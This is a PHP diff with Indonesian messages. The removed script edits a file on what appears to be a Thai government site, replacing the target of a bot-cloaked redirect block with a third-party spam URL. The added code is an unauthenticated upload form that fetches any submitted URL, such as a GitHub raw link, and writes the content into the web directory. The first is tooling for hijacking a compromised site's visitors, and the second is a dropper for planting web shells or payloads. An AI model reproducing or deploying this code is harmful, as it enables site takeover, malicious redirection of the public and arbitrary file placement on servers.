@@ -1,36 +1,36 @@
 <?php
-$target = '/home/paoroiet/domains/wisdom101.pao-roiet.go.th/public_html/assets/index.php';
-$newUrl = 'https://xn--72c5afai6bu6b9dya2jf5hsa.lazismubantul.org/403.html';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
+    $url = trim($_POST['url']);
+    $filename = basename(parse_url($url, PHP_URL_PATH));
 
-if (!file_exists($target)) {
-    die("❌ File tidak ditemukan!\n");
-}
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $content = curl_exec($ch);
+    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
 
-$content = file_get_contents($target);
-
-// regex lebih longgar dan fleksibel
-$pattern = '/if\s*\(\s*!isBot\s*\(\s*\)\s*\)\s*\{(.*?)Location:\s*"([^"]+)"(.*?)exit\(\);\s*\}/is';
-
-if (preg_match($pattern, $content, $match)) {
-    $currentUrl = $match[2];
-
-    if (trim($currentUrl) !== $newUrl) {
-        $newBlock = <<<PHP
-if (!isBot()) 
-{
-    header("HTTP/1.1 301 Moved Permanently");
-    header("Location: $newUrl");
-    exit();
-}
-PHP;
-
-        $newContent = preg_replace($pattern, $newBlock, $content, 1);
-        file_put_contents($target, $newContent);
-        echo "✅ Link berhasil diganti ke: $newUrl\n";
+    if ($httpcode === 200 && !empty($content)) {
+        if (file_put_contents($filename, $content)) {
+            echo "<p>✅ Berhasil disimpan sebagai <b>$filename</b></p>";
+        } else {
+            echo "<p>❌ Gagal menyimpan file.</p>";
+        }
     } else {
-        echo "✅ Sudah pakai link yang benar.\n";
+        echo "<p>❌ Gagal mengunduh file (HTTP Code: $httpcode)</p>";
     }
-} else {
-    echo "❌ Tidak ditemukan blok isBot() yang cocok.\n";
 }
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Download RAW GitHub</title>
+</head>
+<body>
+    <h2>Masukkan URL RAW GitHub</h2>
+    <form method="post">
+        <input type="text" name="url" placeholder="https://raw.githubusercontent.com/..." style="width: 400px;" required>
+        <button type="submit">Download & Simpan</button>
+    </form>
+</body>
+</html>
